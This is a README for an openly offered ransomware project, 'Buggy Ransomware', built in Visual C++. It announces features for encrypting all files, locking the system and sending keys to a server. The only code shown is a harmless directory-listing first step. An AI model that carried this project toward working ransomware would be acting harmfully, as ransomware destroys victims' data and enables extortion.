#### DISCLAIMER : OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON'T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.

<img src="logor.png" alt="logo">

# Buggy Ransomware

Buggy Ransomware is open source  Crypto-Locker. Buggy Ransomware is developed in Visual C++. It has features encrypt all file, lock down the system and send keys back to the server. Multi-threaded functionality helps to this tool make encryption faster.


## Step 1

Getting all files from all drive to encrypting them.

Here is basic program get all list directory & folder.

```
#include <iostream>
#include <stdio.h>
#include <string>
#include <dirent.h>
#include <fstream>

using namespace std;

fstream data_file("data.txt", ios::out);

int main(void)
{

	struct dirent *de;  // Pointer for directory entr
						// opendir() returns a pointer of DIR type. 
	DIR *dr = opendir("d:\\");

	if (dr == NULL)  // opendir returns NULL if couldn't open directory
	{
		printf("Could not open current directory");
		return 0;
	}

	// for readdir()
	while ((de = readdir(dr)) != NULL) {
		//	printf("%s\n", de->d_name);
		data_file << de->d_name << "\n";
	}
	data_file.close();
	closedir(dr);

	data_file.open("data.txt", ios::in);
	string line;
	while (data_file.good()) {
		getline(data_file, line);
		cout << line << endl;
	}

	system("pause");
	return 0;
}
```

# Currently in Development....Happy Hacking:)
